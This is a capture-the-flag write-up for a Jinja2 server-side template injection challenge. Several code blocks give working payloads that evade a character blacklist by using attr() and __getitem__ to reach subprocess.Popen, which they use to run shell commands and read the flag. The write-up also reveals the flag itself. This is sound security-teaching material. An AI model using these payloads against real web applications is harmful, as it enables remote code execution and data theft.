# Challenge link
URL:      [http://45.122.249.68:20029/](http://45.122.249.68:20029/) (maybe the server was shut down)

# Challenge description
I forgot it :>

# Challenge source file
     https://1drv.ms/u/s!AnKnTgw0LN8rfXAkFgu81Lp1urI?e=yEia5a
- Run app.py with Python and the challenge will be hosted on localhost
# Difficulty
Normal

# Author
I forgot it, too :v

# Approach
- The first thing that happened when I connected to the site was being redirected to /wannaw1n?c=hacker :
  ![image](https://github.com/NoSpaceAvailable/WannagameFreshman2023/assets/143888307/27d24f9e-51d8-493e-aec3-a4ae99532494)

- I tried to change *hacker* to something like *lmao* :
  ![image](https://github.com/NoSpaceAvailable/WannagameFreshman2023/assets/143888307/c44aa626-dca0-4312-b4c5-67575f824879)
  

- In this situation, I was thinking about SSTI (Jinja2 template for details), so I tried *{{ 7\*7 }}* :
  ![image](https://github.com/NoSpaceAvailable/WannagameFreshman2023/assets/143888307/34b348f2-5cdf-4437-b099-3048327a4fdc)

- The result confirmed that it was an SSTI attack and the template they used is Jinja2. Now let's construct the payload.

# Problem-solving
  ## Payload constructing
  - I found some interesting Jinja2 template payloads in [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2)
  - First, I tried to inject a random payload to see the behavior of the application:
    ![image](https://github.com/NoSpaceAvailable/WannagameFreshman2023/assets/143888307/29595e75-1eb4-436e-881a-76b2d76faf0a)

  - It has a blacklist, so I should find out what was banned here:
    ![image](https://github.com/NoSpaceAvailable/WannagameFreshman2023/assets/143888307/b7936439-0f40-4aee-9ecf-75c0d088cf30)
    ![image](https://github.com/NoSpaceAvailable/WannagameFreshman2023/assets/143888307/10e6da94-58d4-4691-adc0-8cf76c3f2e71)
    ![image](https://github.com/NoSpaceAvailable/WannagameFreshman2023/assets/143888307/e4bb3a93-3d51-4ff6-bcef-055b417f959f)
    ![image](https://github.com/NoSpaceAvailable/WannagameFreshman2023/assets/143888307/475d3570-bb2f-422d-b824-8050bbe771de)

  - And many more banned words/characters. For no time consumption, I built my payload. Because '.' was banned, I used the attr() function instead:
  - I chose this payload at the link above :
    ```
    {{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()}}
    ```

    ```
    {{ ''|attr('__class__')|attr('__mro__') }}
    ```
    ![image](https://github.com/NoSpaceAvailable/WannagameFreshman2023/assets/143888307/1c5ac358-020f-4a58-b68e-a6e65eca3a56)

  - Because '[' and ']' was blocked, I decided to use *__getitem__* method to get the item at a specific index:

    ```
    {{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')() }}
    ```
    ![image](https://github.com/NoSpaceAvailable/WannagameFreshman2023/assets/143888307/a91a6711-7b73-429d-b606-db4fca49c8c8)

  - With some Python lines, I found that *<class 'subprocess.Popen'>* was indexed as 279:

    ```
    {{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(279) }}
    ```
    ![image](https://github.com/NoSpaceAvailable/WannagameFreshman2023/assets/143888307/d30a043c-499a-423e-a5bc-00fccf8e88f5)

  - Popen let us execute os code.

    ```
    {{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(279)('ls', shell=True, stdout=-1)|attr('communicate')() }}
    ```
    ![image](https://github.com/NoSpaceAvailable/WannagameFreshman2023/assets/143888307/3d8ae101-0bb8-4e2e-8000-7e5f038b79f6)

  - Cat flag:
    
    ![image](https://github.com/NoSpaceAvailable/WannagameFreshman2023/assets/143888307/862aadb1-9d29-4757-97a0-e892c603afc8)

  - It was blocked. I thought that they also blocked *flag*, so I tried *cat \** :
    
    ![image](https://github.com/NoSpaceAvailable/WannagameFreshman2023/assets/143888307/338b92ba-a6e1-472e-8fc8-b0b71728ae57)

  - Flag: W1{U_are_master_in_SSTI}
